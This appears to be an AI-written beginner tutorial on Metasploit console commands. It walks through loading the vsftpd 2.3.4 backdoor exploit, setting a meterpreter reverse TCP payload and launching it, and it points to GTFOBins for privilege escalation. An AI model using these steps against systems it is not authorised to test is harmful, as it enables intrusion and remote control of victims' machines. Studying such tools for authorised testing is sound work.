
---

## 🔥 Metasploit Framework

**Metasploit** is a powerful penetration testing tool used for finding, exploiting, and validating vulnerabilities. It provides a database of exploits, payloads, and scanners.

### 🧰 `msfconsole` (Metasploit Console)

Run this command in terminal (with `sudo` for full permissions):

```bash
sudo msfconsole
```

This launches the Metasploit Framework console where you can use all Metasploit commands.

---

## 📢 Banner Command

```bash
banner
```

This command in `msfconsole` displays a random ASCII-art welcome banner when used inside the console. It's just for fun and aesthetics!

---

## 🔍 Search Command

Used to search for modules, exploits, or payloads:

```bash
search <version_name or keyword>
```

**Example:**

```bash
search vsftpd
```

This searches for exploits or modules related to "vsftpd".

---

## 📌 Use Command

After finding a desired exploit or module:

```bash
use <module_path>
```

**Example:**

```bash
use exploit/unix/ftp/vsftpd_234_backdoor
```

Loads the exploit module.

---

## ⚙️ Show Options

Displays all required and optional settings for the selected module:

```bash
show options
```

---

## 📡 Reverse TCP (Payload)

A **reverse TCP payload** makes the **target system connect back to the attacker’s machine**, giving the attacker remote access (shell).

**Why reverse?** It bypasses firewalls since the victim initiates the connection.

---

## 🎯 Show Payloads

To list all available payloads:

```bash
show payloads
```

You can filter by OS or type using `search`.

---

## 🔧 Set Payload

To set a specific payload with an exploit:

```bash
set PAYLOAD <payload_name>
```

**Example:**

```bash
set PAYLOAD linux/x86/meterpreter/reverse_tcp
```

---

## 🚀 Exploit Command

To launch the exploit:

```bash
exploit
```

Or:

```bash
run
```

This sends the payload using the selected exploit.

---

## 🔎 whereis Command (Linux)

```bash
whereis <command>
```

Locates the binary, source, and manual files of a command.

**Example:**

```bash
whereis nmap
```

---

## 🌐 gtfobins ([https://gtfobins.github.io](https://gtfobins.github.io))

**GTFOBins** is a curated list of Unix binaries that can be used to bypass local security restrictions. Great for **privilege escalation** if sudo or other permissions are misconfigured.

You can check how a certain command (like `less`, `find`, `awk`, etc.) can be abused to gain a shell.

---

## 🧠 Other Useful Resources

* **Rapid7** – Creators of Metasploit
  📍 [https://www.rapid7.com](https://www.rapid7.com)

* **Exploit-DB** – Huge database of public exploits
  📍 [https://www.exploit-db.com](https://www.exploit-db.com)

* **Tenable** – Company behind Nessus scanner
  📍 [https://www.tenable.com](https://www.tenable.com)

* **NIST** – National vulnerability database (NVD) and cybersecurity standards
  📍 [https://nvd.nist.gov](https://nvd.nist.gov)

---

Let me know if you want a **cheat sheet** version or a **PDF download** of this!
